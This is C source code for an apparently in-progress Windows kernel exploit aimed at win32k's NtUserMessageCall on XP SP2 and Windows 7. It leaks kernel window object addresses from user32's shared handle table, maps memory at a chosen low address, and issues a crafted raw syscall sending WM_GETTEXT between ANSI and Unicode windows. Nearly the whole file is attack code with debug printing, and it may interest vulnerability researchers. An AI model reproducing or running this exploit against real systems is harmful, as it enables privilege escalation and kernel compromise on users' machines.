#include "exploit.h"

HWND ansiWindow;
HWND unicodeWindow;
HWND kernelHandle;
ULONG_PTR addr = 0x00200000;
ULONG_PTR shared;

// http://j00ru.vexillium.org/win32k_syscalls/ WinXP SP2  0x11cc  WIn7 SP0 0x11ea
#define __NR_NtUserMessageCall 0x11cc //0x11ea

PSHAREDINFO LocateSharedInfo()
{
	FARPROC gSharedInfo = (FARPROC)GetProcAddress(GetModuleHandle("USER32.dll"), "gSharedInfo");
	ULONG i;
	ULONG_PTR pfnUserRegisterWowHandlers = (ULONG_PTR)GetProcAddress(GetModuleHandle("USER32.dll"), "UserRegisterWowHandlers");

	// Win7 only
	// return (PSHAREDINFO)GetProcAddress(GetModuleHandle("USER32.dll"), "gSharedInfo");

	if (pfnUserRegisterWowHandlers == NULL)
		return NULL;

        for (i = pfnUserRegisterWowHandlers; 
             i <= pfnUserRegisterWowHandlers +0x250; 
             ++i )
        {
            if (0x40c7 == *(WORD*)i && 
                0xb8 == *(BYTE*)(i + 7))
            {
                return (PSHAREDINFO)(*(DWORD*)(i + 8));
            }
        }
}

HWND GetKernelHandle(HWND hwnd)
{
	HWND kernelWindowHandle;
	ULONG i;
	HMODULE hUser32;
	PSHAREDINFO pSharedInfo;
	PSERVERINFO pServerInfo;
	HANDLEENTRY *UserHandleTable;

	//http://volatility-labs.blogspot.co.uk/2012/09/movp-33-analyzing-user-handles-and.html
	hUser32 = GetModuleHandle("USER32.dll");
	printf("User32 @ %p\r\n", hUser32);
	pSharedInfo = LocateSharedInfo();
	printf("SharedInfo @ %p\r\n", pSharedInfo);

	UserHandleTable = pSharedInfo->aheList;
	printf("aheList @ %p\r\n", UserHandleTable);

	pServerInfo = pSharedInfo->psi;
	printf("pServerInfo @ %p\r\n", pServerInfo);
	printf("Handle Count %d\r\n", pServerInfo->cHandleEntries);
	printf("User Delta %p\r\n", pSharedInfo->ulSharedDelta);

	for(i = 0; i < pServerInfo->cHandleEntries; i++ ) 
	{
		__try
		{
			// http://www.mista.nu/research/mandt-win32k-slides.pdf
			kernelWindowHandle = (PVOID)(i | (UserHandleTable[i].wUniq << 0x10));
			if( kernelWindowHandle == hwnd )
			{
				printf("Handle index 0%x (%p==%p)\r\n", i, kernelWindowHandle, hwnd);
				kernelWindowHandle = UserHandleTable[i].phead;
				printf("Kernel Window Handle found! %p\r\n", kernelWindowHandle);
				return kernelWindowHandle;
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER) {}
    }

	return NULL;
}

__declspec(naked) __declspec(noinline) NTSTATUS _NtUserMessageCall(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL Ansi) {
	__asm
	{
		mov eax, __NR_NtUserMessageCall // API Address
		mov edx, 0x7FFE0300				// KiFastSystemCall
		call DWORD PTR DS:[EDX]
		retn 0x1c
	}
}

LRESULT APIENTRY AnsiWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CREATE:
		printf("Ansi Window created %p\r\n", hwnd);
		break;
	case WM_GETTEXT:
		printf("Got message!!!\r\n");
		getchar();
		break;
	default:
		printf("Default Ansi Handler! %x\r\n",uMsg);
		return DefWindowProcA(hwnd, uMsg, wParam, lParam);
	}
}

LRESULT APIENTRY UnicodeWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_NULL:
		printf("Sending UNICODE GET_TEXT MESSAGE to ANSI target hwnd %p\r\n", kernelHandle);
		printf("Buffer %p\r\n", addr);
		//SendMessageW(ansiWindow,WM_GETTEXT,0,0);
		
		printf("Error? 0x%x", GetLastError());
		break;
	case WM_CREATE:
		printf("Unicode Kernel Window Created %p\r\n", hwnd);
		break;
	default:
		printf("Default Unicode Handler! %x\r\n",uMsg);
		return DefWindowProcW(hwnd, uMsg, wParam, lParam);
	}
}

DWORD WINAPI ansiThread( LPVOID lpParam )
{
	const char lpcszClassName [] = "ansiClass";
	WNDCLASSEXA WindowClassExa;
	HINSTANCE hInstance = GetModuleHandle(NULL);

	ZeroMemory(&WindowClassExa, sizeof(WNDCLASSEXA));
	WindowClassExa.cbSize = sizeof(WNDCLASSEXA);
	WindowClassExa.lpfnWndProc = AnsiWndProc;
	WindowClassExa.hInstance = hInstance;
	WindowClassExa.lpszClassName = lpcszClassName;

	if (RegisterClassExA(&WindowClassExa) != 0)
	{
		ansiWindow = CreateWindowExA(0, lpcszClassName, "ANSI Window", 0, 0, 0, 0, 0, unicodeWindow, NULL, hInstance, NULL);
		if (ansiWindow == NULL)
			UnregisterClassA(lpcszClassName, hInstance);
	}
	
	// Let original thread know our HWND handle
	kernelHandle = GetKernelHandle(ansiWindow);

	printf("Ansi thread waiting for message...\r\n");
	while (TRUE)
	{
		GetMessageA(NULL, NULL, 0, 0);
		Sleep(10);
	}
}

int	main(int arc, char **argv)
{
	MSG Msg;
	wchar_t lpcszClassName [] = L"unicodeClass";
	WNDCLASSEXW  WindowClassEx;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	HANDLE hDevice;
	SYSTEM_INFO SystemInfo;
	ULONG Size;
	HMODULE hNtDLL;
	HRESULT res;


	// Thread
	HANDLE  hThread;
	DWORD   dwThreadId;
	ThreadData threadData;

	GetSystemServiceNumber("");
	getchar();

	GetSystemInfo(&SystemInfo);
	Size = SystemInfo.dwPageSize;
	hNtDLL = GetModuleHandle("ntdll.dll");
	printf("NtDLL 0x%p\r\n", hNtDLL);
	NtAllocateVirtualMemory = GetProcAddress(hNtDLL, "NtAllocateVirtualMemory");
	printf("NtAllocateVirtualMemory 0x%p\r\n", NtAllocateVirtualMemory);

	while ((NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &Size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)) != S_OK)
	{
		printf("Failed to allocate addr %p \r\n", addr);
		addr += SystemInfo.dwPageSize*16;
	}

	// Should check this is of format 0x00xx00yy
	printf("Allocated Page @ 0x%p\r\n", addr);

	ZeroMemory(&WindowClassEx, sizeof(WNDCLASSEXW));
	WindowClassEx.cbSize = sizeof(WNDCLASSEXW);
	WindowClassEx.lpfnWndProc = UnicodeWndProc;
	WindowClassEx.hInstance = hInstance;
	WindowClassEx.lpszClassName = lpcszClassName;

	if (RegisterClassExW(&WindowClassEx) != 0)
	{
		// Create a message-only window
		unicodeWindow = CreateWindowExW(0, lpcszClassName, L"KernelWindow", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
		if (unicodeWindow == NULL)
			UnregisterClassW(lpcszClassName, hInstance);
	}
/*
Why??? Already created window and class...
[-] kernel class registered: 00001338
[-] kernel proc called from usermode. msg: 0x0024, wparam: 0x00000000, lparam: 0x001bf310  WM_GETMINMAXINFO
[-] kernel proc called from usermode. msg: 0x0081, wparam: 0x00000000, lparam: 0x001bf308 WM_NCCREATE
[-] kernel proc called from usermode. msg: 0x0083, wparam: 0x00000000, lparam: 0x001bf330 WM_NCCALCSIZE
[-] kernel proc called from usermode. msg: 0x0001, wparam: 0x00000000, lparam: 0x001bf2fc WM_CREATE 
*/
	printf("kernel class %p\r\n", &WindowClassEx);
	printf("kernel windows %p\r\n", unicodeWindow);

	hThread = CreateThread( 
            NULL,                   // default security attributes
            0,                      // use default stack size  
            ansiThread,       // thread function name
            &threadData,          // argument to thread function 
            0,                      // use default creation flags 
            &dwThreadId);

	// Let other thread get running
	shared = (ULONG_PTR)VirtualAlloc(NULL, 0x1000,MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	printf("Shared memory %p\r\n",shared);
	Sleep(1000);
	//SendMessageW(unicodeWindow,WM_NULL,0,0);
	_NtUserMessageCall(kernelHandle, WM_GETTEXT, 0x8, shared, 0x0, 0x2b3, 0x2);
	printf("Error: 0x%x", GetLastError());
	getchar();
	WaitForSingleObject(hThread, INFINITE);
}